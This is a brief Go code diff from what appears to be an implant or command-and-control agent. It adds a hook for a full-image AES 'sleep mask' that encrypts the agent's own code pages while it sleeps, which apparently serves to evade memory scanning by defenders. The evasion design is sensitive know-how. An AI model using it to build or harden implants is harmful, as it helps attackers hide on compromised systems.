@@ -19,6 +19,11 @@ var (
 	activeSleepMask SleepMasker
 	maskRegistry    = map[string]func() SleepMasker{}
 	sleepObfFunc    func(uintptr)
+	// advancedMaskFactory, when set by the windows/amd64 build, returns the
+	// full-image AES sleep mask. It is promoted to the default mask in
+	// InitSleepMask so the agent's own code pages are encrypted during sleep
+	// (not just the 4096-byte config buffer).
+	advancedMaskFactory func() SleepMasker
 )
 
 type basicMask struct{}
